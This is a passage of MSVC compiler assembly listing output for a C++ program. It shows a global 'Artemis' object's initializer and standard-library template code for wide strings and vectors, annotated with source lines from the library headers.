text$di	SEGMENT
??__Eartemis@@YAXXZ PROC				; `dynamic initializer for 'artemis'', COMDAT

; 26   : Artemis artemis;

	sub	rsp, 40					; 00000028H
	lea	rcx, OFFSET FLAT:?artemis@@3VArtemis@@A	; artemis
	call	??0Artemis@@QEAA@XZ
	lea	rcx, OFFSET FLAT:??__Fartemis@@YAXXZ	; `dynamic atexit destructor for 'artemis''
	call	atexit
	add	rsp, 40					; 00000028H
	ret	0
??__Eartemis@@YAXXZ ENDP				; `dynamic initializer for 'artemis''
text$di	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z
_TEXT	SEGMENT
$T1 = 32
_UFirst$ = 40
_ULast$ = 48
this$ = 80
_First$ = 88
_Last$ = 96
_Al$ = 104
??$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> ><std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >,0>, COMDAT

; 2652 :         : _Mypair(_One_then_variadic_args_t{}, _Al) {

$LN6:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H
	mov	rax, QWORD PTR this$[rsp]
	mov	r8, QWORD PTR _Al$[rsp]
	movzx	edx, BYTE PTR $T1[rsp]
	mov	rcx, rax
	call	??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> const &>
	npad	1

; 2653 :         _Adl_verify_range(_First, _Last);

	lea	rdx, QWORD PTR _Last$[rsp]
	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Adl_verify_range@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@V12@@std@@YAXAEBV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@0@0@Z ; std::_Adl_verify_range<std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >,std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > > >

; 2654 :         auto _UFirst = _Get_unwrapped(_First);

	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Get_unwrapped@AEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@@std@@YA?A_TAEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@0@@Z ; std::_Get_unwrapped<std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > > &>
	mov	QWORD PTR _UFirst$[rsp], rax

; 2655 :         auto _ULast  = _Get_unwrapped(_Last);

	lea	rcx, QWORD PTR _Last$[rsp]
	call	??$_Get_unwrapped@AEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@@std@@YA?A_TAEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@0@@Z ; std::_Get_unwrapped<std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > > &>
	mov	QWORD PTR _ULast$[rsp], rax

; 2656 :         if (_UFirst == _ULast) {

	mov	rax, QWORD PTR _ULast$[rsp]
	cmp	QWORD PTR _UFirst$[rsp], rax
	jne	SHORT $LN2@allocator

; 2657 :             _Mypair._Myval2._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

	mov	rax, QWORD PTR this$[rsp]
	lea	rdx, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
	mov	rcx, rax
	call	?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 2658 :             _Tidy_init();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Tidy_init@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_init

; 2659 :         } else {

	jmp	SHORT $LN3@allocator
$LN2@allocator:

; 2660 :             if constexpr (_Is_elem_cptr<decltype(_UFirst)>::value) {
; 2661 :                 _Construct<_Construct_strategy::_From_ptr>(

	mov	rax, QWORD PTR _UFirst$[rsp]
	mov	rcx, QWORD PTR _ULast$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	sar	rax, 1
	mov	rcx, rax
	call	??$_Convert_size@_K@std@@YA_K_K@Z	; std::_Convert_size<unsigned __int64>
	mov	r8, rax
	mov	rdx, QWORD PTR _UFirst$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Construct@$00PEA_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t *>
	npad	1
$LN3@allocator:

; 2662 :                     _UFirst, _Convert_size<size_type>(static_cast<size_t>(_ULast - _UFirst)));
; 2663 :             } else {
; 2664 :                 _Construct_from_iter(_STD move(_UFirst), _STD move(_ULast));
; 2665 :             }
; 2666 :         }
; 2667 :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 72					; 00000048H
	ret	0
??$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> ><std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >,0>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
_UFirst$ = 40
_ULast$ = 48
this$ = 80
_First$ = 88
_Last$ = 96
_Al$ = 104
?dtor$0@?0???$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z@4HA PROC ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> ><std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >,0>'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	call	??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z@4HA ENDP ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> ><std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >,0>'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z
_TEXT	SEGMENT
this$ = 48
__param0$ = 56
__param1$ = 64
??0?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z PROC ; std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >, COMDAT
$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	r8, QWORD PTR __param1$[rsp]
	mov	rdx, QWORD PTR __param0$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0?$_Vector_const_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z ; std::_Vector_const_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >::_Vector_const_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z ENDP ; std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Unwrapped@?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEBAPEA_WXZ
_TEXT	SEGMENT
this$ = 48
?_Unwrapped@?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEBAPEA_WXZ PROC ; std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >::_Unwrapped, COMDAT

; 328  :     _NODISCARD _CONSTEXPR20 value_type* _Unwrapped() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 329  :         return _Unfancy(this->_Ptr);

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z	; std::_Unfancy<wchar_t>

; 330  :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Unwrapped@?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEBAPEA_WXZ ENDP ; std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >::_Unwrapped
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??0?$_Vector_const_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z
_TEXT	SEGMENT
this$ = 48
_Parg$ = 56
_Pvector$ = 64
??0?$_Vector_const_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z PROC ; std::_Vector_const_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >::_Vector_const_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >, COMDAT

; 41   :     _CONSTEXPR20 _Vector_const_iterator(_Tptr _Parg, const _Container_base* _Pvector) noexcept : _Ptr(_Parg) {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Parg$[rsp]
	mov	QWORD PTR [rax], rcx

; 42   :         this->_Adopt(_Pvector);

	mov	rdx, QWORD PTR _Pvector$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Adopt@_Iterator_base0@std@@QEAAXPEBX@Z ; std::_Iterator_base0::_Adopt

; 43   :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0?$_Vector_const_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z ENDP ; std::_Vector_const_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >::_Vector_const_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1386 :     constexpr const _Ty1& _Get_first() const noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 1387 :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 1388 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1382 :     constexpr _Ty1& _Get_first() noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 1383 :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 1384 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??0?$_Vector_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$_Vector_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_Vector_val<std::_Simple_types<wchar_t> >::_Vector_val<std::_Simple_types<wchar_t> >, COMDAT

; 392  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax], 0
	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax+8], 0
	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax+16], 0
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0?$_Vector_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_Vector_val<std::_Simple_types<wchar_t> >::_Vector_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 48
?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEBAAEBV?$allocator@_W@2@XZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal, COMDAT

; 2047 :     _NODISCARD _CONSTEXPR20 const _Alty& _Getal() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2048 :         return _Mypair._Get_first();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 2049 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEBAAEBV?$allocator@_W@2@XZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 48
?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEAV?$allocator@_W@2@XZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal, COMDAT

; 2043 :     _NODISCARD _CONSTEXPR20 _Alty& _Getal() noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2044 :         return _Mypair._Get_first();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 2045 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEAV?$allocator@_W@2@XZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Orphan_range@?$vector@_WV?$allocator@_W@std@@@std@@AEBAXPEA_W0@Z
_TEXT	SEGMENT
this$ = 8
__formal$ = 16
__formal$ = 24
?_Orphan_range@?$vector@_WV?$allocator@_W@std@@@std@@AEBAXPEA_W0@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Orphan_range, COMDAT

; 2040 :     _CONSTEXPR20 void _Orphan_range(pointer, pointer) const {}

	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	ret	0
?_Orphan_range@?$vector@_WV?$allocator@_W@std@@@std@@AEBAXPEA_W0@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Orphan_range
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ
_TEXT	SEGMENT
?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Xlength, COMDAT

; 1999 :     [[noreturn]] static void _Xlength() {

$LN3:
	sub	rsp, 40					; 00000028H

; 2000 :         _Xlength_error("vector too long");

	lea	rcx, OFFSET FLAT:??_C@_0BA@FOIKENOD@vector?5too?5long@
	call	?_Xlength_error@std@@YAXPEBD@Z		; std::_Xlength_error
$LN2@Xlength:

; 2001 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Xlength
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ
_TEXT	SEGMENT
_Myfirst$ = 32
_My_data$ = 40
_Al$ = 48
_Mylast$ = 56
_Myend$ = 64
this$ = 96
?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Tidy, COMDAT

; 1897 :     _CONSTEXPR20 void _Tidy() noexcept { // free all storage

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 1898 :         auto& _Al         = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 1899 :         auto& _My_data    = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 1900 :         pointer& _Myfirst = _My_data._Myfirst;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR _Myfirst$[rsp], rax

; 1901 :         pointer& _Mylast  = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 1902 :         pointer& _Myend   = _My_data._Myend;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 16
	mov	QWORD PTR _Myend$[rsp], rax

; 1903 : 
; 1904 :         _My_data._Orphan_all();

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 1905 : 
; 1906 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rax, QWORD PTR _Myfirst$[rsp]
	cmp	QWORD PTR [rax], 0
	je	SHORT $LN2@Tidy

; 1907 :             _Destroy_range(_Myfirst, _Mylast, _Al);

	mov	r8, QWORD PTR _Al$[rsp]
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Destroy_range@V?$allocator@_W@std@@@std@@YAXPEA_WQEA_WAEAV?$allocator@_W@0@@Z ; std::_Destroy_range<std::allocator<wchar_t> >

; 1908 :             _ASAN_VECTOR_REMOVE;
; 1909 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rax, QWORD PTR _Myend$[rsp]
	mov	rcx, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	rax, QWORD PTR [rax]
	sub	rax, rcx
	sar	rax, 1
	mov	r8, rax
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ; std::allocator<wchar_t>::deallocate

; 1910 : 
; 1911 :             _Myfirst = nullptr;

	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	QWORD PTR [rax], 0

; 1912 :             _Mylast  = nullptr;

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	QWORD PTR [rax], 0

; 1913 :             _Myend   = nullptr;

	mov	rax, QWORD PTR _Myend$[rsp]
	mov	QWORD PTR [rax], 0
$LN2@Tidy:

; 1914 :         }
; 1915 :     }

	add	rsp, 88					; 00000058H
	ret	0
?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Tidy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z
_TEXT	SEGMENT
_Myfirst$ = 32
_My_data$ = 40
_Al$ = 48
_Mylast$ = 56
_Myend$ = 64
this$ = 96
_Newvec$ = 104
_Newsize$ = 112
_Newcapacity$ = 120
?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Change_array, COMDAT

; 1875 :     _CONSTEXPR20 void _Change_array(const pointer _Newvec, const size_type _Newsize, const size_type _Newcapacity) {

$LN4:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 1876 :         // orphan all iterators, discard old array, acquire new array
; 1877 :         auto& _Al         = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 1878 :         auto& _My_data    = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 1879 :         pointer& _Myfirst = _My_data._Myfirst;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR _Myfirst$[rsp], rax

; 1880 :         pointer& _Mylast  = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 1881 :         pointer& _Myend   = _My_data._Myend;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 16
	mov	QWORD PTR _Myend$[rsp], rax

; 1882 : 
; 1883 :         _My_data._Orphan_all();

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 1884 : 
; 1885 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rax, QWORD PTR _Myfirst$[rsp]
	cmp	QWORD PTR [rax], 0
	je	SHORT $LN2@Change_arr

; 1886 :             _Destroy_range(_Myfirst, _Mylast, _Al);

	mov	r8, QWORD PTR _Al$[rsp]
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Destroy_range@V?$allocator@_W@std@@@std@@YAXPEA_WQEA_WAEAV?$allocator@_W@0@@Z ; std::_Destroy_range<std::allocator<wchar_t> >

; 1887 :             _ASAN_VECTOR_REMOVE;
; 1888 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rax, QWORD PTR _Myend$[rsp]
	mov	rcx, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	rax, QWORD PTR [rax]
	sub	rax, rcx
	sar	rax, 1
	mov	r8, rax
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ; std::allocator<wchar_t>::deallocate
$LN2@Change_arr:

; 1889 :         }
; 1890 : 
; 1891 :         _Myfirst = _Newvec;

	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR _Newvec$[rsp]
	mov	QWORD PTR [rax], rcx

; 1892 :         _Mylast  = _Newvec + _Newsize;

	mov	rax, QWORD PTR _Newvec$[rsp]
	mov	rcx, QWORD PTR _Newsize$[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	mov	rcx, QWORD PTR _Mylast$[rsp]
	mov	QWORD PTR [rcx], rax

; 1893 :         _Myend   = _Newvec + _Newcapacity;

	mov	rax, QWORD PTR _Newvec$[rsp]
	mov	rcx, QWORD PTR _Newcapacity$[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	mov	rcx, QWORD PTR _Myend$[rsp]
	mov	QWORD PTR [rcx], rax

